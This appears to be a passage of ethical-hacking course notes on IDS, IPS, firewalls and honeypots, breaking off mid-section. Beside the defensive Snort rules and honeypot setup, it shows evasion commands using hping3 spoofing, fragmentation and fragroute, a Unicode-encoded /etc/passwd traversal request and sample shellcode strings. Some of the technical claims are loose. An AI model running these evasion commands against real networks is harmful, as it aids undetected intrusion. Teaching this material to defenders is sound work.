# Evading IDS, Firewalls, and Honeypots

> #TLDR
> This module covers advanced techniques for evading Intrusion Detection Systems (IDS), Firewalls, and Honeypots, along with corresponding defence tools and methods. It aims to equip ethical hackers with practical knowledge on bypassing and countering these defences through hands-on examples and detailed use cases.

---

## What We Get From This Exercise
###### #Objectives #Evading-IDS-Firewalls-and-Honeypots

- Understand IDS, IPS, Firewalls, and Honeypots in depth.
- Learn techniques for evading each type of security layer.
- Explore tools commonly used in IDS/Firewall evasion and honeypot detection.
- Gain practical skills in detecting network security measures and implementing countermeasures.

---

## Table of Contents

1. [Intrusion Detection System (IDS)](#intrusion-detection-system-ids)
	1. [How an IDS Works](#how-an-ids-works)
	2. [Where IDS Resides in the Network](#where-ids-resides-in-the-network)
	3. [IDS Preprocessor](#ids-preprocessor)
	4. [Types of IDS Alerts](#types-of-ids-alerts)
		 1. [True Positive (Attack - Alert)](#true-positive-attack---alert)
		 2. [False Positive (No Attack - Alert)](#false-positive-no-attack---alert)
		 3. [False Negative (Attack - No Alert)](#false-negative-attack---no-alert)
		 4. [True Negative (No Attack - No Alert)](#true-negative-no-attack---no-alert)
2. [Intrusion Prevention System (IPS)](#intrusion-prevention-system-ips)
	1. [Classification of IPS](#classification-of-ips)
	2. [Advantages of IPS over IDS](#advantages-of-ips-over-ids)
3. [Firewall](#firewall)
	1. [Firewall Architecture](#firewall-architecture)
		1. [Bastion Host](#bastion-host)
		2. [Screened Subnet (DMZ)](#screened-subnet-dmz)
		3. [Multi-homed Firewall](#multi-homed-firewall)
	2. [Types of Firewalls](#types-of-firewalls)
	3. [Hardware Firewalls](#hardware-firewalls)
		1. [Software Firewalls](#software-firewalls)
	4. [Firewall Technologies](#firewall-technologies)
	5. [Packet Filtering](#packet-filtering)
		1. [Circuit-Level Gateways](#circuit-level-gateways)
		2. [Application-Level Firewall](#application-level-firewall)
		3. [Stateful Multilayer Inspection Firewall](#stateful-multilayer-inspection-firewall)
		4. [Application Proxies](#application-proxies)
		5. [Network Address Translation (NAT)](#network-address-translation-nat)
		6. [Virtual Private Network (VPN)](#virtual-private-network-vpn)
4. [Honeypot](#honeypot)
	1. [Types of Honeypots](#types-of-honeypots)
	2. [Low-Interaction Honeypots](#low-interaction-honeypots)
		1. [Medium-Interaction Honeypots](#medium-interaction-honeypots)
		2. [High-Interaction Honeypots](#high-interaction-honeypots)
		3. [Pure Honeypots](#pure-honeypots)
5. [IDS/IPS Evasion Techniques](#idsips-evasion-techniques)
	1. [Insertion Attack](#insertion-attack)
	2. [Evasion](#evasion)
	3. [Polymorphic Shellcode](#polymorphic-shellcode)
	4. [Unicode Evasion](#unicode-evasion)
	5. [Fragmentation Attack](#fragmentation-attack)
	6. [ASCII Shellcode](#ascii-shellcode)
	7. [Denial-of-Service Attack](#denial-of-service-attack)
	8. [Overlapping Fragments](#overlapping-fragments)
	9. [Application-Layer Attacks](#application-layer-attacks)
	10. [Obfuscating](#obfuscating)
	11. [Time-To-Live Attacks](#time-to-live-attacks)
	12. [Desynchronization](#desynchronization)
	13. [False Positive Generation](#false-positive-generation)
	14. [Urgency Flag](#urgency-flag)
	15. [Encryption](#encryption)
	16. [Session Splicing](#session-splicing)
	17. [Invalid RST Packets](#invalid-rst-packets)
	18. [Flooding](#flooding)
6. [Firewall Evasion Techniques](#firewall-evasion-techniques)
	1. [Firewalking](#firewalking)
	2. [Using an IP Address in Place of a URL](#using-an-ip-address-in-place-of-a-url)
	3. [Banner Grabbing](#banner-grabbing)
	4. [Using a Proxy Server](#using-a-proxy-server)
	5. [IP Address Spoofing](#ip-address-spoofing)
	6. [ICMP Tunnelling](#icmp-Tunnelling)
	7. [Source Routing](#source-routing)
	8. [ACK Tunnelling and HTTP Tunnelling](#ack-Tunnelling-and-http-Tunnelling)
	9. [Tiny Fragments](#tiny-fragments)
	10. [SSH and DNS Tunnelling](#ssh-and-dns-Tunnelling)
	11. [Bypassing Endpoint Security](#bypassing-endpoint-security)
	12. [Ghostwriting](#ghostwriting)
		1. [Bypassing Signature-based Detection](#bypassing-signature-based-detection)
		2. [Application Whitelisting](#application-whitelisting)
			1. [DLL Hijacking](#dll-hijacking)
		3. [Clearing Memory Hooks](#clearing-memory-hooks)
		4. [Dechaining Macros](#dechaining-macros)
			 1. [Spawning through ShellCOM](#spawning-through-shellcom)
			 2. [Spawning using XMLDOM](#spawning-using-xmldom)
			 3. [Creating Scheduled Tasks](#creating-scheduled-tasks)
			 4. [Registry Modification](#registry-modification)
7. [HTTP Tunnelling Techniques](#http-tunnelling-techniques)
	1. [HTTPort and HTTHost](#httport-and-hthhost)
	2. [Super Network Tunnel](#super-network-tunnel)
8. [Bypassing NAC and Endpoint Security](#bypassing-nac-and-endpoint-security)
	1. [VLAN Hopping](#vlan-hopping)
	2. [Using Pre-authenticated Device](#using-pre-authenticated-device)
	3. [Dechaining Macros](#dechaining-macros)
	4. [Clearing Memory Hooks](#clearing-memory-hooks)
	5. [Passing Encoded Commands](#passing-encoded-commands)
	6. [Fast Flux DNS Method](#fast-flux-dns-method)
	7. [Ghostwriting](#ghostwriting)
	8. [Using Metasploit Templates](#using-metasploit-templates)
	9. [Timing-based Evasion](#timing-based-evasion)
	10. [Using Application Whitelisting](#using-application-whitelisting)
	11. [XLM Weaponization](#xlm-weaponization)
	12. [Bypassing Symantec Endpoint Protection](#bypassing-symantec-endpoint-protection)
	13. [Hosting Phishing Sites](#hosting-phishing-sites)
9. [Intrusion Detection Tools](#intrusion-detection-tools)
	1. [Snort](#snort)
	2. [Suricata](#suricata)
	3. [Alien Vault OSSIM](#alien-vault-ossim)
	4. [SolarWinds Security Event Manager](#solarwinds-security-event-manager)
	5. [OSSEC](#ossec)
	6. [Bro/Zeek IDS](#brozeek-ids)
	7. [AIDE](#aide)
	8. [Sagan Log Analysis Engine](#sagan-log-analysis-engine)
10. [Firewall Identification Techniques](#firewall-identification-techniques)
	1. [Port Scanning](#port-scanning)
	2. [Firewalking](#firewalking)
11. [Firewall Evasion Tools](#firewall-evasion-tools)
	1. [Nmap](#nmap)
	2. [Metasploit](#metasploit)
	3. [IDS Evasion](#ids-evasion)
	4. [Hyperion](#hyperion)

---
# **1. Intrusion Detection System (IDS)**

Intrusion Detection Systems (IDS) monitor network or system activities for malicious actions or policy violations. They analyse incoming traffic, detecting threats based on signature matching, anomaly detection, or behavioural analysis.\

## 1. How an IDS Works

An IDS captures and inspects network packets, looking for suspicious patterns that match known threat signatures or anomalous behaviour profiles.

### Steps in IDS Operation:
1. **Packet Capture**: IDS captures all packets on a network segment.
2. **Preprocessing**: Filters and organizes packets for analysis.
3. **Analysis**: Compares packets to known patterns or checks for unusual behaviour.
4. **Alerting**: Sends alerts to administrators if a threat is detected.

### Example IDS Software: Snort

Snort is a popular open-source IDS with both real-time packet analysis and logging capabilities.

#### Basic Snort Command
```bash
# Run Snort in intrusion detection mode
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
```

- `-A console`: Outputs alerts to the console.
- `-q`: Runs Snort in quiet mode, showing only alerts.
- `-c`: Specifies the configuration file.
- `-i eth0`: Specifies the network interface.

### Advanced IDS Rules

#### Sample Snort Rule: Detecting Unauthorized Access
```plaintext
alert tcp any any -> 192.168.1.0/24 22 (msg:"SSH access attempt"; sid:1000001;)
```

This rule alerts on SSH access attempts to any IP in the `192.168.1.0/24` subnet.

---

## 2. Where IDS Resides in the Network

The placement of an IDS in the network affects its ability to monitor traffic. Common placements include:

| Position       | Function                                                                 |
| -------------- | ------------------------------------------------------------------------ |
| **Perimeter**  | Monitors traffic entering and leaving the network.                       |
| **DMZ**        | Protects externally accessible servers while watching for incoming threats. |
| **Internal**   | Detects lateral movement or internal attacks within the network.         |

### Example Placement Strategy

- **Outside the Firewall**: Captures all incoming traffic, detecting attacks before they reach internal systems.
- **Inside the Firewall**: Filters out benign traffic, reducing noise and focusing on threats.

---

## 3. IDS Preprocessor

Preprocessors in IDS are modules that manipulate packets before analysis. They enhance detection by reassembling packets, normalizing traffic, and removing potential evasions.

### Common IDS Preprocessors:

1. **Stream5**: Reassembles TCP streams, critical for detecting attacks spread across multiple packets.
2. **Frag3**: Handles fragmented IP packets to prevent fragmentation-based evasion.
3. **HTTP Inspect**: Normalizes HTTP traffic, essential for detecting web attacks.

#### Configuring Snort Preprocessors

Add the following to `snort.conf` to enable HTTP inspection:
```plaintext
preprocessor http_inspect: global iis_unicode_map unicode.map 1252
preprocessor http_inspect_server: server default profile all ports { 80 8080 }
```

This configuration detects abnormal HTTP requests on ports 80 and 8080.

---

## 4. Types of IDS Alerts

IDS alerts are categorized based on their accuracy in detecting malicious activities.

### 4.1 True Positive (Attack - Alert)
A true positive occurs when an actual attack is detected and generates an alert, ensuring effective threat identification.

#### Example
An alert triggered by Snort detecting an SSH brute-force attempt:
```plaintext
alert tcp any any -> 192.168.1.100 22 (msg:"SSH brute-force detected"; threshold:type both, track by_src, count 5, seconds 60; sid:1000002;)
```

This rule detects five SSH attempts from the same source within 60 seconds.

### 4.2 False Positive (No Attack - Alert)
A false positive happens when an IDS flags legitimate activity as an attack. High false positives can desensitize administrators and may lead to ignoring actual threats.

#### Example Scenario
An IDS flags a large file transfer as a DDoS attack due to high bandwidth usage. Adjusting thresholds or excluding certain traffic types can help reduce false positives.

### 4.3 False Negative (Attack - No Alert)
A false negative occurs when an IDS fails to detect a real attack. These are critical to address, as they allow threats to bypass detection.

#### Mitigation Example
To prevent false negatives, IDS rules must be updated regularly to recognize new threats. Using both signature and anomaly-based detection helps reduce missed attacks.

### 4.4 True Negative (No Attack - No Alert)
A true negative is a benign event that does not generate an alert, indicating that the IDS is correctly ignoring normal network activity.

---

## Additional Commands and Tips

- **Configuring Snort for Specific Ports**:
   ```plaintext
   alert tcp any any -> 192.168.1.0/24 [21,23,80] (msg:"Common ports access detected"; sid:1000003;)
   ```
   This rule triggers an alert on FTP (21), Telnet (23), and HTTP (80) access attempts to the `192.168.1.0/24` subnet.

- **Thresholds and Rate Limiting**:
   To avoid alert fatigue, apply thresholds that specify the number of times an event can trigger within a time frame.

   ```plaintext
   alert icmp any any -> any any (msg:"ICMP flood detected"; threshold:type limit, track by_src, count 10, seconds 60; sid:1000004;)
   ```

This rule triggers an alert if more than 10 ICMP packets are received from the same source within 60 seconds.

---
# 2. Intrusion Prevention System (IPS)

An Intrusion Prevention System (IPS) actively monitors and controls traffic to prevent malicious activities. Unlike IDS, which passively monitors traffic, an IPS is inline with the traffic flow, allowing it to block or drop packets identified as threats in real-time. An IPS enhances security by continuously filtering and blocking unwanted traffic before it can reach sensitive network areas.

---

## 1. Classification of IPS

IPS can be classified based on their monitoring scope and deployment location.

### Types of IPS:

1. **Host-Based IPS (HIPS)**
   - **Description**: Monitors and protects individual hosts or devices.
   - **Functionality**: Uses policies and rules specific to the operating system or application.
   - **Examples**: McAfee Host Intrusion Prevention, OSSEC.

   #### HIPS Configuration Example:
   ```
   <rule id="1005" level="6">
       <decoded_as>File Modification</decoded_as>
       <description>Unauthorized file change detected</description>
       <match>critical_file.txt</match>
   </rule>
   ```
   This rule triggers an alert if critical files on the host are modified without authorization.

2. **Network-Based IPS (NIPS)**
   - **Description**: Monitors network traffic across segments, preventing suspicious activities from spreading.
   - **Functionality**: Protects networks from DDoS attacks, malware spread, and protocol violations.
   - **Examples**: Snort in IPS mode, Suricata.

   #### Snort Inline Mode Configuration:
   ```bash
   sudo snort -Q -c /etc/snort/snort.conf -i eth0
   ```
   - `-Q`: Enables inline mode for active threat prevention.
   - `-c /etc/snort/snort.conf`: Specifies configuration file.
   - `-i eth0`: Defines the network interface.

3. **Hybrid IPS**
   - **Description**: Integrates both HIPS and NIPS capabilities.
   - **Functionality**: Provides comprehensive threat prevention across both network and host layers.

4. **Cloud-Based IPS**
   - **Description**: Monitors and protects cloud environments, scaling with cloud services.
   - **Functionality**: Integrates seamlessly with cloud infrastructure to detect and block attacks in real-time.

### IPS Types Summary Table

| IPS Type          | Monitoring Level       | Use Cases                                          |
| ----------------- | ---------------------- | -------------------------------------------------- |
| Host-Based (HIPS) | OS/Application Layer   | Endpoint protection for critical servers and PCs    |
| Network-Based (NIPS) | Network Layer      | Network-wide protection against external threats   |
| Hybrid            | OS & Network Layer     | Security in enterprise environments                |
| Cloud-Based       | Cloud Infrastructure   | Security for dynamic cloud-based workloads         |

---

## 2. Advantages of IPS over IDS

An IPS offers several advantages over an IDS by actively preventing and blocking attacks rather than merely detecting them.

### Key Advantages

1. **Real-Time Threat Mitigation**
   - **Description**: An IPS blocks malicious traffic immediately, protecting network resources.
   - **Use Case**: Blocking SQL injection attacks directed at web servers.
   - **Example Rule (Snort)**:
     ```plaintext
     drop tcp any any -> any 80 (msg:"SQL Injection Blocked"; content:"UNION SELECT"; sid:1000015;)
     ```
     This rule detects and blocks SQL injection attempts containing the phrase `UNION SELECT`.

2. **Automated Response to Threats**
   - **Description**: Automatically blocks malicious IPs and terminates suspicious connections, reducing the need for manual intervention.
   - **Use Case**: Preventing brute-force SSH login attempts by blocking repeated connection requests.
   - **Example Rule**:
     ```plaintext
     drop tcp any any -> any 22 (msg:"SSH Brute-Force Detected"; threshold:type both, track by_src, count 5, seconds 60; sid:1000016;)
     ```
     This rule blocks SSH access from any IP with more than five login attempts within one minute.

3. **Enhanced Network Security**
   - **Description**: Prevents lateral movement and restricts internal threats from propagating.
   - **Use Case**: Blocking DDoS attacks by filtering malicious ICMP or UDP flood traffic.
   - **Example Rule**:
     ```plaintext
     drop icmp any any -> any any (msg:"ICMP flood detected"; threshold:type limit, track by_src, count 10, seconds 30; sid:1000017;)
     ```
     This rule limits ICMP traffic, blocking sources with excessive ICMP requests.

4. **Improved Network Efficiency**
   - **Description**: Reduces network congestion by blocking unnecessary traffic.
   - **Use Case**: Filtering malicious packets, freeing up bandwidth for legitimate traffic.

5. **Compliance with Security Standards**
   - **Description**: Enforces security policies by blocking non-compliant or suspicious traffic.
   - **Use Case**: Blocking attempts to exfiltrate data, ensuring adherence to data protection regulations.

---

## Example Commands for IPS Configuration

1. **Suricata Inline Mode**
   ```bash
   sudo suricata -c /etc/suricata/suricata.yaml -i eth0 --af-packet
   ```
   - `--af-packet`: Enables inline mode to block traffic based on defined rules.

2. **Blocking IP Addresses with IPTables**
   ```bash
   sudo iptables -A INPUT -s 203.0.113.5 -j DROP
   ```
   Blocks all incoming traffic from the IP address `203.0.113.5`.

3. **Logging Blocked Connections in Suricata**
   ```yaml
   # suricata.yaml
   af-packet:
     - interface: eth0
       defrag: yes
       cluster-id: 99
       cluster-type: cluster_flow
       copy-mode: ips
       copy-iface: eth1
   ```
   This configuration logs traffic that is blocked by Suricata in inline mode.

---

# **3. Firewall**

### Firewall Architecture

- **Bastion Host:** Mediates between internal and external networks.
- **Screened Subnet (DMZ):** Protects internal resources by segmenting traffic.
- **Multi-homed Firewall:** Connects to multiple segments for fine-grained control.

### Types of Firewalls

- **Hardware Firewalls:** Dedicated devices for network-level filtering.
- **Software Firewalls:** Installed on individual devices, suitable for endpoint protection.

### Firewall Technologies

| Technology                   | OSI Layer | Description                     |
| ---------------------------- | --------- | ------------------------------- |
| Packet Filtering              | Network   | Inspects individual packets     |
| Circuit-Level Gateways       | Session   | Controls sessions and connections |
| Application-Level Firewalls  | Application | Filters application-specific commands |
| Stateful Multilayer Inspection | All Layers | Tracks sessions and packet state |

---

# **4.Honeypot**

A honeypot is a decoy system set up to attract, detect, and study unauthorized access attempts on an organization’s network. By emulating vulnerabilities or legitimate services, honeypots capture valuable threat intelligence on attackers' tools, techniques, and behaviours, allowing organizations to improve their security measures.

---

## 1. Types of Honeypots

Honeypots vary in interaction levels and deployment strategies. They can be classified into four main types:

1. **Low-Interaction Honeypots**: Emulate specific services, capturing basic information while minimizing risk.
2. **Medium-Interaction Honeypots**: Simulate more realistic environments, capturing a broader range of attacker behaviours.
3. **High-Interaction Honeypots**: Provide attackers with a fully operational environment, capturing in-depth details of attack tactics.
4. **Pure Honeypots**: Mirror production environments for comprehensive monitoring and early warning of malicious activities.

---

## 2. Low-Interaction Honeypots

Low-interaction honeypots simulate a limited set of services. These honeypots are relatively safe, as they do not provide attackers with a full environment. They are mainly used to detect scans, simple exploits, and gather surface-level threat data.

- **Tools and Examples**:
  - **Dionaea**: A low-interaction honeypot designed to catch malware by emulating vulnerable services (e.g., SMB, FTP).
  - **KFSensor**: Deploys decoy services and alerts on various suspicious activities, such as port scanning.
  - **Honeyd**: An older, but highly configurable honeypot that simulates entire network segments, including custom responses.

### Dionaea Setup Example
Dionaea can be configured to listen on multiple ports, allowing it to capture a variety of malware samples.

```bash
# Start Dionaea with specific settings to emulate FTP and SMB services
sudo dionaea -l /var/log/dionaea -c /etc/dionaea/dionaea.conf
```

### Honeyd Basic Configuration
Honeyd can be set to respond to specific ports and IP ranges, providing simple interaction for attackers.

```plaintext
# honeyd.conf
create template
set template personality "Linux 2.4.18"
add template tcp port 22 open
bind 192.168.1.100 template
```

**Explanation**: This configuration sets up a basic template to emulate an SSH service on IP `192.168.1.100`.

---

## 3. Medium-Interaction Honeypots

Medium-interaction honeypots provide a more realistic environment, capturing richer data on attacker behaviour. These honeypots offer limited interaction with emulated systems, giving attackers a sense of genuine engagement while maintaining control.

- **Tools and Examples**:
  - **Cowrie**: A well-known SSH/Telnet honeypot that captures attacker commands, keystrokes, and even downloaded files.
  - **HoneyPy**: A modular Python-based honeypot that emulates common vulnerabilities for various services (HTTP, FTP, SSH).
  - **Kojoney2**: A medium-interaction honeypot emulating an SSH server, ideal for capturing login attempts and shell commands.

### Cowrie Setup and Examples
Cowrie captures every command entered by the attacker, simulating an SSH session with detailed interaction logging.

```bash
# Install and run Cowrie
git clone https://github.com/cowrie/cowrie.git
cd cowrie
sudo ./bin/cowrie start
```

#### Example of Captured Session:
Cowrie logs commands like `wget`, `curl`, and file downloads, providing insights into the tools attackers may deploy on a real server.

**Cowrie Configuration for Custom SSH Banner**:
In `cowrie.cfg`, you can set a banner to mimic a specific OS.
```plaintext
ssh_banner = "Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-48-generic x86_64)"
```

**Explanation**: This setting enhances realism by presenting a fake OS version to the attacker.

### Kojoney2 Capture Example
Kojoney2 emulates SSH to capture login attempts and shell activity, making it effective for detecting credential brute-forcing and early post-exploitation behaviour.

```plaintext
# Example configuration for Kojoney2
listen_port = 2222
fake_users = ["root", "admin", "guest"]
```

---

## 4. High-Interaction Honeypots

High-interaction honeypots are fully functional environments that allow attackers to interact as if on a real system. These honeypots are resource-intensive but offer the most comprehensive data on attacker techniques, tools, and methods.

- **Tools and Examples**:
  - **Honeynet**: A network of interconnected high-interaction honeypots, often used by researchers to capture advanced attack methods.
  - **VMWare/VirtualBox**: Many high-interaction honeypots use virtual machines to simulate real servers, allowing attackers full access while logging their activity.
  - **Cuckoo Sandbox**: While primarily a malware analysis sandbox, Cuckoo can simulate full systems to capture malicious behaviours in detail.

### Example Setup for a Virtual Machine Honeypot
Setting up a honeypot on a virtual machine allows complete control over the environment, including network segmentation and logging.

1. **Create Isolated VM**: Set up an isolated virtual machine using VMWare or VirtualBox.
2. **Install Monitoring Tools**: Use network packet capture (e.g., tcpdump, Wireshark) to log traffic and system commands.
3. **Control Outbound Traffic**: Limit outbound connections to prevent the VM from attacking external systems, often achieved with a firewall like `iptables`.

```bash
# Example iptables rule to block outbound traffic
sudo iptables -A OUTPUT -m state --state NEW -j DROP
```

**Explanation**: This rule blocks new outbound connections, containing potential threats within the honeypot environment.

---

## 5. Pure Honeypots

Pure honeypots simulate actual production systems to capture comprehensive attacker TTPs (tactics, techniques, and procedures). These honeypots are typically deployed alongside real services and systems, capturing high-value intelligence while maintaining a degree of separation from legitimate environments.

- **Purpose**: Pure honeypots are ideal for tracking advanced threats and providing early warning of intrusion attempts.
- **Examples**:
  - **Deception Networks**: Companies may deploy a network of pure honeypots within production environments.
  - **Custom VM or Physical Servers**: Deploying real servers with production-like services and configurations for high-fidelity monitoring.

### Deployment Strategy for Pure Honeypots
1. **Deploy in Production-Like Environment**: Place honeypots within segmented parts of the network to avoid accidental exposure.
2. **Enable Full Packet Capture**: Use network monitoring tools (e.g., Zeek, tcpdump) to log all traffic.
3. **analyse Attacker behaviour**: Pure honeypots provide high-value data for understanding sophisticated threats.

### Example Setup
Use **Zeek (formerly Bro)** to capture traffic in a pure honeypot environment:

```bash
# Run Zeek on the honeypot network interface
sudo zeek -i eth0 local.zeek
```

**Explanation**: Zeek passively monitors all traffic, providing comprehensive logs and insights into attacker behaviour.

---

### Honeypot Detection Tools

Attackers use specialized tools to detect the presence of honeypots within a network. These tools help identify honeypots by analyzing network behaviour, responses, and configurations that differentiate them from genuine systems. Here are some commonly used honeypot detection tools:

| Tool Name                  | Description                                                                                                   | Features                                                                                                           |
|----------------------------|---------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------|
| **Send-Safe Honeypot Hunter** | Checks lists of HTTPS and SOCKS proxies to identify honeypots. Useful for validating proxy lists to avoid honeypots. | - Supports HTTPS, SOCKS4, and SOCKS5 proxies<br>- Can check multiple remote or local proxy lists simultaneously<br>- Uploads "Valid proxies" and "All except honeypots" to FTP<br>- Automates proxy list processing at set intervals |
| **kippo_detect**           | Identifies honeypots based on Kippo, a popular SSH honeypot.                                                 | - Useful for detecting Kippo honeypots on SSH-enabled networks. Available on GitHub for easy access |

These tools are essential for attackers who want to avoid interacting with honeypots, as honeypots are typically set up to lure, detect, and analyse unauthorized activities.

---

# **5. IDS/IPS Evasion Techniques**

Attackers use various evasion techniques to bypass Intrusion Detection and Prevention Systems (IDS/IPS), allowing them to infiltrate networks undetected. By leveraging these techniques, attackers manipulate packet behaviour, circumvent detection, and compromise systems.

---

| **#** | **Technique**              | **Description**                                                                                                          |
| ----- | -------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| 1     | Insertion Attack           | Confuses IDS by sending packets accepted by IDS but rejected by the target system.                                       |
| 2     | Evasion                    | Ensures packets bypass the IDS while reaching the target system.                                                         |
| 3     | Denial-of-Service Attack   | Overwhelms IDS with high traffic volume to exhaust resources and allow malicious traffic to pass through undetected.     |
| 4     | Obfuscating                | Modifies payloads (e.g., Base64 encoding) to evade signature-based detection.                                            |
| 5     | False Positive Generation  | Generates noise by triggering multiple benign alerts to hide actual malicious traffic.                                   |
| 6     | Session Splicing           | Splits the malicious payload across multiple packets to avoid IDS detection.                                             |
| 7     | Unicode Evasion            | Encodes attack strings in Unicode to avoid pattern matching by IDS.                                                      |
| 8     | Fragmentation Attack       | Splits the payload across multiple fragments to bypass IDS with short reassembly timeouts.                               |
| 9     | Overlapping Fragments      | Sends fragments that partially overlap, causing IDS to misinterpret reassembled packets.                                 |
| 10    | Time-To-Live (TTL) Attacks | Manipulates TTL values so packets expire before reaching IDS, hitting only the target.                                   |
| 11    | Urgency Flag               | Uses TCP Urgency Flag to create gaps in packet streams that IDS might miss.                                              |
| 12    | Invalid RST Packets        | Sends TCP Reset packets with invalid checksums to trick IDS into ignoring ongoing connections.                           |
| 13    | Polymorphic Shellcode      | Encrypts payload with a decoder, changing each time to evade detection.                                                  |
| 14    | ASCII Shellcode            | Contains only ASCII characters, evading signature-based detection by IDS.                                                |
| 15    | Application-Layer Attacks  | Craft attacks to look like legitimate requests at the application layer, bypassing IDS.                                  |
| 16    | Desynchronization          | Splits packet sequences, causing IDS and host to interpret traffic differently.                                          |
| 17    | Encryption                 | Encrypts traffic to hide payloads from IDS, which cannot inspect encrypted traffic. 👌                                   |
| 18    | Flooding                   | Sends excessive traffic to exhaust IDS resources, allowing malicious packets to pass undetected once IDS is overwhelmed. |

---

## 1. Insertion Attack

An insertion attack confuses the IDS by forcing it to accept invalid packets that the end host discards. The attacker sends packets that reach the IDS but are discarded by the host, leading the IDS to falsely consider the traffic benign.

### Example of an Insertion Attack:
- **IP Checksum Manipulation**: The attacker intentionally corrupts the IP checksum, which is ignored by the IDS but discarded by the host.

```plaintext
# Command example for packet manipulation
hping3 -c 1 --spoof <target-IP> --sign fake --setseq 1 <target-IP>
```

---

## 2. Evasion

In this technique, the attacker ensures that packets bypass the IDS while reaching the target. Evasion attacks rely on differences in how the IDS and host system process packets.

### Example:
- **TCP Stream Manipulation**: An attacker fragments the malicious payload across multiple packets. If the IDS discards one packet, it misses part of the attack, allowing it to bypass detection.

---

## 3. Denial-of-Service Attack

DoS attacks overwhelm IDS resources with high traffic volume, causing legitimate attack traffic to slip through due to resource exhaustion.

---

## 4. Obfuscating

Obfuscation modifies payloads to evade pattern matching. Examples include changing the case of characters, adding non-functional instructions, or using encoding schemes like Base64.

---

## 5. False Positive Generation

Attackers trigger multiple alerts on benign activities to generate noise, hiding real attacks among false positives.

---

## 6. Session Splicing

In session splicing, the attacker divides the attack payload across multiple small packets, making it harder for the IDS to reconstruct the attack.

### Example:
Using a tool like `fragroute` to implement session splicing:
```bash
fragroute -f ./config-file <target-IP>
```

---

## 7. Unicode Evasion

Attackers can encode attack strings using Unicode, where a single character can have multiple representations, thus confusing the IDS pattern matching.

### Example:
- **UTF-8 Encoded Slash `/`**: An attacker uses `%u2215` instead of `/` in a path to avoid pattern detection.

```plaintext
GET /%u2215etc%u2215passwd HTTP/1.1
```

---

## 8. Fragmentation Attack

Fragmentation attacks split the payload across multiple fragments. If the IDS has a shorter timeout for reassembling fragments than the host, it discards them, allowing the host to reassemble the attack.

### Example:
Use hping3 to send fragmented packets with delay:
```bash
hping3 -c 1 -f -d 40 --frag --setseq 1 <target-IP>
```

---

## 9. Overlapping Fragments

In overlapping fragments, the attacker sends fragments that partially overlap with each other. The IDS may misinterpret the reassembled packet, while the host reassembles the payload correctly.

---

## 10. Time-To-Live (TTL) Attacks

TTL attacks manipulate packet TTL values so that they expire before reaching the IDS, reaching only the intended host.

---

## 11. Urgency Flag

The TCP Urgency Flag can cause some IDS to drop the subsequent byte, creating gaps in the stream and bypassing detection.

### Example:
- **Urgent Flag Manipulation**:
```plaintext
# Manipulate urgency pointer in TCP packets
hping3 -c 1 --urg <target-IP>
```

---

## 12. Invalid RST Packets

The attacker sends TCP Reset (RST) packets with invalid checksums. The IDS assumes the session ended, but the target system continues to process valid packets.

---

## 13. Polymorphic Shellcode

Polymorphic shellcode encrypts the payload, including a decoder in each attack, so it changes each time. This variation avoids detection by signature-based IDS.

### Example Shellcode:
```c
char shellcode[] =
  "\xeb\x19\x5e\x31\xc9\xb1\x19\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6"
  "\xeb\x05\xe8\xe2\xff\xff\xffHello World";
```

**Explanation**: This encoded payload changes each execution, making it hard for IDS to detect.

---

## 14. ASCII Shellcode

ASCII shellcode contains only ASCII characters, avoiding detection by signature-based IDS that do not match ASCII-only payloads.

### Example Shellcode:
```c
char shellcode[] =
  "LLLLYhb0pLX5b0pLHSSPPWQPPaPWSUTBRDJfh5tDS";
```

---

## 15. Application-Layer Attacks

Application-layer attacks are designed to appear as legitimate requests at the application layer, bypassing IDS that primarily focus on lower-layer traffic.

---

## 16. Desynchronization

Desynchronization attacks split packet sequences, causing the IDS and host to interpret traffic differently.

---

## 17. Encryption

Attackers use encryption (e.g., SSH, SSL) to hide payloads in encrypted sessions, bypassing IDS that cannot inspect encrypted traffic.

---

## 18. Flooding

Flooding involves sending excessive traffic to overwhelm IDS resources. This type of attack exhausts IDS resources, allowing malicious packets to pass through undetected once the IDS is overwhelmed.

---

# **6. Firewall Evasion Techniques**

Firewall evasion techniques allow attackers to bypass firewall security, accessing restricted networks and resources. These methods exploit weaknesses in firewall configurations, network protocols, and packet inspection to infiltrate systems undetected.

---

| **#** | **Technique**                              | **Description**                                                                                           |
|-------|--------------------------------------------|-----------------------------------------------------------------------------------------------------------|
| 1     | Firewalking                                | Uses TTL values to probe firewall rules and map accessible ports.                                         |
| 2     | Banner Grabbing                            | Extracts information from services to identify firewall and OS details.                                   |
| 3     | IP Address Spoofing                        | Disguises source IP to bypass IP-based filtering rules.                                                   |
| 4     | Source Routing                             | Controls packet route to bypass specific network points, potentially avoiding firewall nodes.             |
| 5     | Tiny Fragments                             | Breaks packets into small fragments to evade firewalls that inspect only the initial fragments.           |
| 6     | Using an IP Address in Place of a URL      | Uses IP instead of domain name to bypass domain-based restrictions.                                       |
| 7     | Using a Proxy Server                       | Routes traffic through a proxy to conceal source IP and bypass firewall restrictions.                     |
| 8     | ICMP Tunneling                             | Encapsulates data in ICMP packets to bypass firewall by exploiting common diagnostic traffic.             |
| 9     | ACK Tunneling and HTTP Tunneling           | Embeds data in ACK or HTTP packets to evade firewall by mimicking legitimate traffic.                     |
| 10    | SSH and DNS Tunneling                      | Uses SSH or DNS protocols to tunnel data through firewalls that allow these services.                     |
| 11    | Through External Systems                   | Leverages external systems to relay traffic, avoiding direct interaction with the firewall.               |
| 12    | Through MITM Attack                        | Employs man-in-the-middle techniques to intercept and inject traffic, bypassing firewall restrictions.    |
| 13    | Through Content and XSS Attack             | Uses cross-site scripting to deliver payloads indirectly, bypassing firewall controls.                    |
| 14    | Through HTML Smuggling                     | Embeds malicious payloads within HTML content to evade firewall inspection.                               |
| 15    | Through Windows BITS                       | Exploits Background Intelligent Transfer Service (BITS) in Windows to bypass network filtering.           |

---

## 1. Firewalking

Firewalking is a network mapping technique that uses TTL (Time-To-Live) values to probe firewall rules. By sending packets with specific TTL values, attackers can detect firewall policies by observing responses from intermediary devices.

### Example Command
Using `nmap` to firewalk:
```bash
nmap -Pn --traceroute <target-IP>
```

### Tool: Firewalk
Firewalk is also a tool specifically designed for this technique, identifying firewall rules by analyzing packet responses.

---

## 2. Using an IP Address in Place of a URL

Typing the IP address of a site instead of its domain name bypasses filters based on domain names, as firewalls may not inspect IP-based requests as closely.

### Example:
To access Facebook, use its IP:
